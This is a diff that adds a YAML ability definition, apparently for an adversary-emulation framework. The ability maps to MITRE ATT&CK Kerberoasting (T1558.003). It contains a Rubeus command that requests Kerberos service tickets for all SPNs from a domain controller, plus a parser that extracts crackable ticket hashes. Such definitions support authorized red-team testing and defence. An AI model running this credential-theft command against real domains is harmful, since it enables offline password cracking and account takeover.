@@ -1,0 +1,36 @@
+- tactic: credential-access
+  technique_name: Steal or Forge Kerberos Tickets Kerberoasting
+  technique_id: T1558.003
+  name: Kerberoast Rubeus
+  description: Request Kerberos service tickets for all SPNs with Rubeus
+  executors:
+  - name: cmd
+    platform: windows
+    command: '".\Rubeus.exe kerberoast /domain:#{remote.host.fqdn} /dc:#{remote.host.ip}"'
+    code: null
+    language: null
+    build_target: null
+    payloads: []
+    uploads: []
+    timeout: 60
+    parsers:
+    - module: plugins.stockpile.app.parsers.rubeus_kerberoast
+      parserconfigs:
+      - source: domain.user.name
+        edge: has_crackable_tgs
+        target: domain.user.crackable_tgs
+        custom_parser_vals: {}
+    cleanup: []
+    variations: []
+    additional_info: {}
+  requirements: []
+  privilege: Elevated
+  repeatable: false
+  buckets:
+  - credential-access
+  additional_info: {}
+  access: {}
+  singleton: false
+  plugin: stockpile
+  delete_payload: true
+  id: 2797bb09-3b49-4295-b5da-26333bf0b61d
